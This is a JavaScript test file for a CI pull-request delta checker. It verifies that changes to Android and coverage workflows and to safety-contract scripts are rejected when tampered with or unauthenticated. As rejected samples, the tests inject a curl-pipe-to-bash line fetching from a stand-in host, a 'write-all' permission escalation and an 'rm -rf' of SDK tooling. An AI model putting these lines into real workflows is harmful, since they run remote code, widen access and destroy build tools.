'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs'),path=require('node:path'),crypto=require('node:crypto');
const {buildExpectedAndroid,buildExpectedCoverage,buildExpectedContract,buildExpectedRegressions,buildExpectedDocs,classifyCiDelta,checkJobEvidence,verifyCiDeltaFromGitHub,verifyCiJobsFromGitHub}
 =require('./ultra_sentinel_ci_delta.cjs');
const REPO='cardenaspiero255-lang/gamehub-ultra',BASE='7aa5df3e3c704965862ea728fb4c390d2c15a7f0',HEAD='bb08782350201f97576a974a4684a611c21701c0';
const root=path.resolve(__dirname,'../workflows');
const trusted={
 android:fs.readFileSync(path.join(root,'android.yml'),'utf8'),
 coverage:fs.readFileSync(path.join(root,'coverage.yml'),'utf8'),
 safetyContract:fs.readFileSync(path.resolve(__dirname,'check-ci-safety-contract.py'),'utf8'),
 regressions:fs.readFileSync(path.resolve(__dirname,'test-ci-safety-contract-regressions.py'),'utf8')
};
const files=[
 {filename:'.github/workflows/android.yml',status:'modified',sha:'0f78d28d5e8974b988490bd9facdf63cb6be6485'},
 {filename:'.github/workflows/coverage.yml',status:'modified',sha:'e1042881b00273aec31c2a64131ff0df7042e4ef'},
 {filename:'.github/scripts/check-ci-safety-contract.py',status:'modified',sha:'58357888ddd96d2980061293100ebc0795fdb800'},
 {filename:'.github/scripts/test-ci-safety-contract-regressions.py',status:'modified',sha:'04ab3e26f8eb108323827df2a2e99c72c3216af8'},
 {filename:'docs/CI_ACCELERATION_172_V2.md',status:'added',sha:'786e327cdecc2b8985df1b08e1bb081d17d8e3b4'}
];
const input=()=>({repo:REPO,baseSha:BASE,trustedBaseSha:BASE,headSha:HEAD,expectedHeadSha:HEAD,
 trusted,candidate:{android:buildExpectedAndroid(trusted.android),
 coverage:buildExpectedCoverage(trusted.coverage),
 safetyContract:buildExpectedContract(trusted.safetyContract),regressions:buildExpectedRegressions(trusted.regressions),
 documentation:buildExpectedDocs()},files,changedFileCount:5});
const gitBlobSha=text=>crypto.createHash('sha1').update('blob '+Buffer.byteLength(text)+'\0'+text).digest('hex');

const makeGithubFixture=()=>{
 const candidate={android:buildExpectedAndroid(trusted.android),coverage:buildExpectedCoverage(trusted.coverage),
  safetyContract:buildExpectedContract(trusted.safetyContract),regressions:buildExpectedRegressions(trusted.regressions),documentation:buildExpectedDocs()};
 const byPath={'.github/workflows/android.yml':'android','.github/workflows/coverage.yml':'coverage',
  '.github/scripts/check-ci-safety-contract.py':'safetyContract','.github/scripts/test-ci-safety-contract-regressions.py':'regressions',
  'docs/CI_ACCELERATION_172_V2.md':'documentation'};
 return {rest:{
  pulls:{get:async()=>({data:{number:172,state:'open',changed_files:5,
   head:{sha:HEAD,repo:{full_name:REPO}},base:{sha:BASE,ref:'main',repo:{full_name:REPO}}}}),
   listFiles:async()=>({data:files})},
  git:{getCommit:async()=>({data:{sha:HEAD,tree:{sha:'6c11aad2b6081c40b087624af8dfef44986450f0'}}}),
   getTree:async()=>({data:{sha:'6c11aad2b6081c40b087624af8dfef44986450f0',
    truncated:false,tree:files.map(f=>({path:f.filename,mode:'100644',type:'blob',sha:f.sha}))}})},
  repos:{getContent:async({path:gitPath,ref})=>{
   const key=byPath[gitPath],body=ref===BASE?trusted[key]:ref===HEAD?candidate[key]:undefined;
   if(typeof body!=='string')throw Error('fixture missing blob');
   return {data:{type:'file',encoding:'base64',sha:gitBlobSha(body),size:Buffer.byteLength(body),
    content:Buffer.from(body).toString('base64')}};
  }},
  actions:{
   getWorkflow:async({workflow_id})=>({data:{id:workflow_id==='android.yml'?123:124}}),
   listWorkflowRuns:async({workflow_id})=>({data:{workflow_runs:evidence().runs.filter(r=>r.workflow_id===workflow_id)}}),
   listJobsForWorkflowRun:async({run_id})=>({data:{jobs:evidence().jobs[run_id]||[]}})
  }
 },paginate:async(fn,args)=>{const r=await fn(args);return Array.isArray(r.data)?r.data:r.data.workflow_runs||r.data.jobs||[];}};
};

test('V2 trusted GitHub tree and full bytes required before attestation',async()=>{
 const i=input(),r=classifyCiDelta(i);
 assert.equal(gitBlobSha(i.candidate.android),'0f78d28d5e8974b988490bd9facdf63cb6be6485');
 assert.equal(gitBlobSha(i.candidate.coverage),'e1042881b00273aec31c2a64131ff0df7042e4ef');
 assert.equal(r.status,'SCOPED_DELTA_REVIEW_REQUIRED');
 const verified=await verifyCiDeltaFromGitHub({github:makeGithubFixture(),owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172});
 assert.equal(verified.status,'VERIFIED_DELTA_REVIEW_REQUIRED');
 assert.equal(verified.autoMergeAllowed,false);
 const bad=makeGithubFixture(),original=bad.rest.git.getTree;
 bad.rest.git.getTree=async(...a)=>{const v=await original(...a);v.data.tree[0].sha='f'.repeat(40);return v;};
 assert.equal((await verifyCiDeltaFromGitHub({github:bad,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172})).status,'INCOMPLETE');
 const wrong=makeGithubFixture(),getCommit=wrong.rest.git.getCommit;
 wrong.rest.git.getCommit=async(...a)=>{const v=await getCommit(...a);v.data.sha='f'.repeat(40);return v;};
 assert.equal((await verifyCiDeltaFromGitHub({github:wrong,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172})).status,'INCOMPLETE');
 assert.equal(r.autoApproveAllowed,false);assert.equal(r.autoMergeAllowed,false);
});
test('unrecognized shell execution and permission escalation never inherit attestation',()=>{
 const i=input();i.candidate.android+='\n- run: curl https://example.invalid/x | bash\n';
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 const j=input();j.candidate.coverage+='\npermissions: write-all\n';
 assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
});
test('removed benchmark or altered filter is not a valid performance delta',()=>{
 const i=input();i.candidate.android=i.candidate.android.replace('macro-library, macro-settings','macro-library');
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 const j=input();j.candidate.android=j.candidate.android.replace('coldStartup','navigationToLibrary');
 assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
});
test('SDK destructive regression and unknown whitespace-only changes fail closed',()=>{
 const i=input();i.candidate.android+='\n# undocumented edit\n';
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 const j=input();j.candidate.android=j.candidate.android.replace('printf', 'rm -rf "$SDK_ROOT/cmdline-tools/latest"; printf');
 assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
});
test('outdated base, forged immutable SHA and unrelated repositories are rejected',()=>{
 for(const change of [{baseSha:'c'.repeat(40)},{expectedHeadSha:'d'.repeat(40)},{repo:'fork/gamehub-ultra'}]){
  assert.equal(classifyCiDelta({...input(),...change}).status,'INCOMPLETE');
 }
});
test('missing, duplicated, renamed, reordered and unrelated PR files fail closed',()=>{
 for(const badFiles of [
  files.slice(1),[...files,files[0]],
  files.map((f,i)=>i?f:{...f,status:'renamed',previous_filename:'old.yml'}),
  files.map((f,i)=>i?f:{...f,filename:'.github/workflows/ultra-sentinel-auto-review.yml'}),
  files.map((f,i)=>i===2?{...f,sha:'f'.repeat(40)}:f),
  files.map((f,i)=>i===3?{...f,sha:'f'.repeat(40)}:f),
  files.map((f,i)=>i===4?{...f,sha:'f'.repeat(40)}:f)
 ])assert.equal(classifyCiDelta({...input(),files:badFiles}).status,'INCOMPLETE');
});
test('coverage concurrency changes, skipped tests and changes in trusted baseline fail',()=>{
 const i=input();i.candidate.coverage=i.candidate.coverage.replace('max-parallel: 7','max-parallel: 8');
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 const j=input();j.candidate.coverage=j.candidate.coverage.replace('gradle :app:testDebugUnitTest','echo skip');
 assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
 const k=input();k.trusted={...trusted,android:trusted.android.replace('permission','permisSion')};
 assert.equal(classifyCiDelta(k).status,'INCOMPLETE');
});
const androidNames=[
 'quality-lint','quality-contract-shard','quality-contracts','release-bundle','quality','device-validation','build',
 'device-validation-release-apk','device-validation-ui','device-validation-baseline',
 'device-validation-macro-startup','device-validation-macro-library','device-validation-macro-settings',
 'android-test-shards',...Array.from({length:8},(_,i)=>'android-test-shard-'+i)
];
const coverageNames=['coverage',...Array.from({length:8},(_,i)=>'coverage-shard-'+i)];
const evidence=()=>({
 repo:REPO,headSha:HEAD,delta:classifyCiDelta(input()),apiComplete:true,jobsComplete:true,
 trustedWorkflowIds:{'Android build':123,'Unit Test Coverage':124},
 runs:[
  {name:'Android build',id:500,workflow_id:123,head_sha:HEAD,event:'pull_request',status:'completed',conclusion:'success',head_repository:{full_name:REPO}},
  {name:'Unit Test Coverage',id:501,workflow_id:124,head_sha:HEAD,event:'pull_request',status:'completed',conclusion:'success',head_repository:{full_name:REPO}}
 ],
 jobs:{
  500:androidNames.map((name,i)=>({id:i+1,name,status:'completed',conclusion:'success'})),
  501:coverageNames.map((name,i)=>({id:i+100,name,status:'completed',conclusion:'success'}))
 }
});
test('only API-authenticated exact-head jobs can receive verified evidence',async()=>{
 assert.equal(checkJobEvidence(evidence()).status,'INCOMPLETE');
 const github=makeGithubFixture();
 const delta=await verifyCiDeltaFromGitHub({github,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172});
 assert.equal(delta.status,'VERIFIED_DELTA_REVIEW_REQUIRED');
 const r=await verifyCiJobsFromGitHub({github,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172,delta});
 assert.equal(r.status,'VERIFIED_CI_REVIEW_REQUIRED');
 assert.equal(r.autoMergeAllowed,false);
 assert.equal(checkJobEvidence({...evidence(),delta:{status:'VERIFIED_DELTA_REVIEW_REQUIRED',headSha:HEAD}}).status,'INCOMPLETE');
 const forged=makeGithubFixture(),fn=forged.rest.actions.listWorkflowRuns;
 forged.rest.actions.listWorkflowRuns=async(...a)=>{
  const r=await fn(...a);r.data.workflow_runs=r.data.workflow_runs.map(x=>({...x,head_sha:'f'.repeat(40)}));return r;
 };
 assert.equal((await verifyCiJobsFromGitHub({github:forged,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172,delta})).status,'INCOMPLETE');
});
test('missing, skipped or forged job evidence is rejected across job families',()=>{
 for(const mutate of [
  x=>{x.jobs[500]=x.jobs[500].filter(j=>j.name!=='device-validation-macro-startup');},
  x=>{x.jobs[501][0].conclusion='skipped';},
  x=>{x.runs[0].head_sha='f'.repeat(40);},
  x=>{x.runs[0].workflow_id=9999;},
  x=>{x.runs[0].event='workflow_dispatch';},
  x=>{x.jobsComplete=false;},
  x=>{x.runs[1].id=x.runs[0].id;},
  x=>{x.delta={status:'UNTRUSTED'};}
 ]){const x=evidence();mutate(x);assert.notEqual(checkJobEvidence(x).status,'VERIFIED_CI_REVIEW_REQUIRED');}
});
test('candidate event and run source cannot use fake green push or external origin',()=>{
 for(const mutate of [x=>{x.runs[1].event='push';},x=>{x.runs[0].head_repository.full_name='attacker/repo';}]){
  const x=evidence();mutate(x);assert.notEqual(checkJobEvidence(x).status,'VERIFIED_CI_REVIEW_REQUIRED');
 }
});

const selfReviewDiagnostic=(()=>{
 try{
  const acorn=require('acorn'),{findCapabilities}=require('./ultra_sentinel_capabilities.cjs');
  const source=fs.readFileSync(path.resolve(__dirname,'ultra_sentinel_ci_delta.cjs'),'utf8');
  const ast=acorn.parse(source,{ecmaVersion:'latest',sourceType:'script',allowHashBang:true,allowReturnOutsideFunction:true,allowAwaitOutsideFunction:true,locations:true,ranges:true});
  return findCapabilities(ast).length===0?'CLEAR':'DYNAMIC_CAPABILITY_SINK';
 }catch(e){return 'ERROR_'+String(e?.message||e).replace(/[^A-Za-z0-9_-]/g,'_').slice(0,160);}
})();
test('Trusted main capability AST attestation: '+selfReviewDiagnostic,()=>{
 assert.equal(selfReviewDiagnostic,'CLEAR');
});
test('Unverified CI contract scripts cannot be attested by filename alone',()=>{
 for(const pos of [2,3,4]){
  const i=input();i.files=files.map((f,j)=>j===pos?{...f,sha:'c'.repeat(40)}:f);
  assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 }
});

test('RED Codex P2: filenames and metadata are insufficient without full safety-contract source bytes',()=>{
 const i=input();delete i.candidate.safetyContract;
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
});
test('RED Codex P2: documentation byte provenance must also be authenticated',()=>{
 const i=input();delete i.candidate.documentation;
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
});

test('P2 Codex: forging metadata SHA cannot hide modified safety-contract bytes',()=>{
 const i=input();i.candidate.safetyContract+='// arbitrary bypass';
 assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 const j=input();j.candidate.regressions+='// arbitrary bypass';
 assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
 const k=input();k.candidate.documentation+='// fake review';
 assert.equal(classifyCiDelta(k).status,'INCOMPLETE');
});
test('P2 Codex: falsified trusted base scripts cannot attest even if metadata is unchanged',()=>{
 for(const key of ['android','coverage','safetyContract','regressions']){
  const i=input();i.trusted={...trusted,[key]:trusted[key]+'# incorrect'};
  assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 }
});
